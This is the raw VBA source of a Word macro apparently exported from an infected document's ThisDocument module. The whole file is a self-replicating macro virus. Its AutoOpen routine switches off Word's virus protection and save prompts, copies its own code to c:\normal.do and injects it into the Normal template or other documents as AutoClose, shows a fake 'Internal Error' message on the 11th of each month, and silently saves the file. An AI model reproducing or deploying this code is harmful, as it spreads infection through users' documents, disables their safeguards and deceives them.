   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub AutoOpen()
     On Error GoTo out
     Options.VirusProtection = False
     Options.SaveNormalPrompt = False
     Options.ConfirmConversions = False
     ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
     nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
     If nt > 30 And ad > 0 Then GoTo out
     If nt < 30 Then
       Set host = NormalTemplate.VBProject.VBComponents.Item(1)
       ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
       ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\normal.do"
     End If
     If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
     If Day(Now) = 11 Then
       MsgBox "Internal Error!  Restart Word.", 0, "Microsoft Word"
      End If
     host.codemodule.AddFromFile ("c:\normal.do")
     With host.codemodule
       For x = 1 To 4
         .deletelines 1
       Next x
     End With
     If nt < 30 Then
       With host.codemodule
       .replaceline 1, "Sub AutoClose()"
       End With
     End If

   out:
     ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

   End Sub
